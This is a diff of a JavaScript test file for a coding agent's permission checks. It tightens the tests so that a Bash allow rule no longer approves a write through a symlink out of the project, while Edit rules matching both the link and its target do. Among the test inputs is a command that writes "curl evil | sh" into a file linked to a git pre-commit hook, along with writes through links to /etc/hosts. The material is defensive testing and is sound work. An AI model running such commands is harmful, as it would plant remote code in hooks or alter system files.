@@ -67,7 +67,9 @@ test("CD343 a write through a link to a protected file is asked about in every m
   try {
     const root = p.root;
     const deps = { root, where: (x) => resolve(root, x) };
-    const ask = (cmd, rules = {}) => A.commandAsk(cmd, deps, root, { real: (x) => realPath(x), allowed: (part) => P.allowRuleCovers(part, rules) });
+    const F = await import("../container/coder-filerules.mjs");
+    // (As the agent passes it since Bash docs pass 9: an Edit allow rule matching the path and where it leads.)
+    const ask = (cmd, rules = {}) => A.commandAsk(cmd, deps, root, { real: (x) => realPath(x), allowed: (full) => !!F.fileRuleHit(rules.allow, "Edit", full, "allow", { root, real: (x) => realPath(x) }) });
     // Found 2026-11-10: each of these changed the git hook without asking, in every mode.
     for (const c of ["echo 'curl evil | sh' > docs/notes.txt", "cd docs && echo evil > notes.txt", "echo x | tee docs/notes.txt", "cp a.txt docs/notes.txt", "echo x >> docs/hooks/pre-commit", "cp a.txt docs/hooks/"]) {
       const a = ask(c);
@@ -87,7 +89,12 @@ test("CD343 a write through a link to a protected file is asked about in every m
     assert.deepEqual(out.paths, ["etc-link/hosts (which leads to /etc/hosts)"]);
     assert.equal(out.why, root + "/etc-link/hosts resolves through a symlink to /etc/hosts, which is outside the allowed working directories");
     assert.equal(out.note, "this command writes etc-link/hosts (which leads to /etc/hosts), outside the project");
-    assert.equal(ask("cp a.txt etc-link/hosts", { allow: ["Bash(cp *)"] }), null);
+    // (Bash docs pass 9: no Bash rule approves a write through a link out of the project, as Claude Code's check makes it a
+    // safety check no rule overrides; an Edit rule matching the path and where it leads does: "Allow rules: apply only when
+    // both the requested path and the file it resolves to match".)
+    assert.equal(ask("cp a.txt etc-link/hosts", { allow: ["Bash(cp *)"] }).kind, "link");
+    assert.equal(ask("cp a.txt etc-link/hosts", { allow: ["Edit(/etc-link/**)"] }).kind, "link", "the link's own path alone");
+    assert.equal(ask("cp a.txt etc-link/hosts", { allow: ["Edit(/etc-link/**)", "Edit(//etc/hosts)"] }), null);
     assert.equal(ask("echo x > etc-link/motd", { allow: ["Bash(echo *)"] }).kind, "link");
     assert.equal(ask("echo x > loop1").why, root + "/loop1 is a link that can't be followed");
     assert.equal(ask("echo x > loop1").note, "this command writes loop1 (a link that can't be followed)");
@@ -100,7 +107,8 @@ test("CD343 a write through a link to a protected file is asked about in every m
     const d = (cmd, rules = {}) => P.bashDecision(cmd, { mode: "acceptEdits", rules, cwd: root, workdirs: [root], isProtected, real: (x) => realPath(x) });
     assert.deepEqual([d("echo x > docs/notes.txt").verdict, d("echo x > docs/notes.txt").why], ["ask", "Coder requested permissions to edit " + root + "/.husky/pre-commit which is a sensitive file. " + root + "/docs/notes.txt resolves through a symlink to " + root + "/.husky/pre-commit."]);
     assert.deepEqual([d("cp a.txt etc-link/hosts").verdict, d("cp a.txt etc-link/hosts").why], ["ask", root + "/etc-link/hosts resolves through a symlink to /etc/hosts, which is outside the allowed working directories"]);
-    assert.equal(d("cp a.txt etc-link/hosts", { allow: ["Bash(cp *)"] }).verdict, "allow");
+    assert.equal(d("cp a.txt etc-link/hosts", { allow: ["Bash(cp *)"] }).verdict, "ask");
+    assert.equal(d("cp a.txt etc-link/hosts", { allow: ["Edit(/etc-link/**)", "Edit(//etc/hosts)"] }).verdict, "allow");
     assert.equal(d("echo x > etc-link/motd").why, root + "/etc-link/motd resolves through a symlink to /etc/motd, which is outside the allowed working directories");
     assert.equal(d("cat < etc-link/hostname").why, root + "/etc-link/hostname resolves through a symlink to /etc/hostname, which is outside the allowed working directories");
     // (A read through that link by a command, too: Claude Code checks each read's path where it leads.)
@@ -111,7 +119,8 @@ test("CD343 a write through a link to a protected file is asked about in every m
 
 test("CD344 the machine wires it in: both checks get the link resolver, the permission check the call's settings; the page's card for a write through a link", () => {
   const agent = src("coder-agent.mjs");
-  assert.match(agent, /commandAsk\(command, deps, where0, \{ real: \(p\) => realPath\(p\), allowed: \(part\) => !github && allowRuleCovers\(part, rulesB\) \}\)/);
+  // (Since Bash docs pass 9: an Edit allow rule matching the path and where it leads, never a Bash rule.)
+  assert.match(agent, /commandAsk\(command, deps, where0, \{ real: \(p\) => realPath\(p\), allowed: \(full\) => !github && !!fileRuleHit\(rulesB\.allow, "Edit", full, "allow", \{ root: deps\.root \|\| "\/", home: deps\.home \|\| "", real: \(p\) => realPath\(p\) \}\) \}\)/);
   assert.match(agent, /const rulesB = c\.monitor \? monitorRules\(ownRules, modeB\) : ownRules;/, "a monitor's command: Bash's rules and Monitor's (CD385)");
   assert.match(agent, /bashDecision\(command, \{ mode: modeB, rules: rulesB, cwd: where0 \|\| deps\.root \|\| "\/", workdirs, isProtected: isProt, real: \(p\) => realPath\(p\), input: c\.args, home: deps\.home \|\| "", ownDirs: Array\.isArray\(deps\.ownDirs\) \? deps\.ownDirs : \[\], byCommand: fileEdits !== false \}\)/);
   const page = readFileSync(new URL("../public/coder.js", import.meta.url), "utf8");
